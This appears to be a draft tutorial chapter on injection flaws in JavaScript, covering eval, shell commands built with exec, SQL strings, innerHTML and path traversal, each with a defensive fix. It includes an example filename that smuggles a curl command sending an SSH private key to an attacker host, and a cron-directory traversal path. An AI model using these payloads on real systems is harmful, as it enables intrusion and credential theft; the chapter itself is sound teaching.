---
title: Code in strings
summary: eval, the string that becomes a command, and the rule that keeps data out of code.
chapter: Security and shipping
minutes: 13
status: draft
---

## eval runs a string as code

```js
const expression = '1 + 1';

console.log(eval(expression));       // 2
```

`eval` parses and runs a string in the current scope, which means it can read and write every local variable around it.
That is the first problem: a string that reaches `eval` can reach anything the surrounding function can. The other three:

- The engine cannot optimise a function containing `eval`, because it cannot know what the string will do to the scope.
- A content security policy that forbids `unsafe-eval` blocks it, which is a good reason to have such a policy.
- In a browser, a string from a user runs with the page's privileges.

```js
eval('{' + userInput + '}');
```

That line appears in code written before `JSON.parse` existed. It is a remote code execution hole rather than a parser,
and `JSON.parse` is the replacement in every case.

```js
const parse = new Function('return ' + expression);
```

`new Function` compiles a string into a function. It does not see the local scope, which makes it less dangerous than
`eval` and still code from a string, so the same rule applies.

## The rule

Data and code are different things. A value from a request is data, and the moment it is concatenated into something that
gets parsed as code, it can be code. That covers four surfaces, and each has the same fix.

## A shell command

```js
import { exec } from 'node:child_process';

exec(`convert ${filename} out.png`);
```

A filename of `a.png; curl http://attacker/?x=$(cat ~/.ssh/id_rsa)` runs a second command. The fix is to pass the
arguments as an array so nothing is parsed as a shell:

```js
import { execFile } from 'node:child_process';

execFile('convert', [filename, 'out.png']);
```

`execFile` and `spawn` take the program and its arguments separately, so a filename with a semicolon in it is a filename.
The shell is what turns a string into a command, so not using one is the fix. If a shell is genuinely required, quote and
validate, and prefer neither.

## A query

```js
const query = `select * from rows where key = '${key}'`;
```

A classic injection, and it is not specific to any language or driver. Parameterised queries are the answer everywhere,
and that is a database subject. What is worth saying here is that the same reasoning applies to any string that another
system parses: a filter expression, an LDAP query, a GraphQL document.

## Markup

```js
element.innerHTML = `<p>${userText}</p>`;
```

In a browser, a string assigned to `innerHTML` is parsed as HTML, so a `<script>` in the user's text runs. The fix is to
put the text where it is text:

```js
element.textContent = userText;

const paragraph = document.createElement('p');
paragraph.textContent = userText;
element.append(paragraph);
```

That is a browser concern rather than a language one, and it is the most common injection bug in web applications.

## A path

```js
const target = path.join(directory, request.query.name);

await writeFile(target, body);
```

A name of `../../etc/cron.d/job` writes outside the directory, because `join` resolves the relative segments rather than
rejecting them. A name with a null byte used to truncate a path on some systems. Resolve the path and check that the
result is still inside the directory:

```js
const resolved = path.resolve(directory, name);

if (!resolved.startsWith(path.resolve(directory) + path.sep)) {
  throw new Error('path escapes the directory');
}
```

Better still, do not take a path from a request at all: take an identifier and look up the path yourself.

## Escaping is not the same as parameterising

```js
const safe = input.replaceAll("'", "''");
```

Escaping works when the escaping rules exactly match what the other side expects. That is rarely true in practice:
different databases, different character sets, a double escape in the wrong order, a value that arrives already escaped.
Parameterising removes the question by keeping the data out of the string being parsed.

The same distinction applies to regular expressions, where escaping a string before it becomes a pattern is necessary
and a check on the pattern itself is still needed for the backtracking case.

## The one place a string has to become code

A configuration language, a template, a plugin system: something has to be interpreted. If it is unavoidable, the
options in order of preference are a data format parsed with `JSON.parse`, a small expression language, or a sandbox with
a process boundary. Running untrusted code in the same process as your secrets is the option to avoid, because every
JavaScript sandbox built on the same interpreter has been escaped at some point.

## Check yourself

Find one place in a codebase you know where a value from outside is concatenated into a string that something else
parses. Then rewrite a command built with `exec` as one built with `execFile`, and a path taken from a request as a
lookup of an identifier.
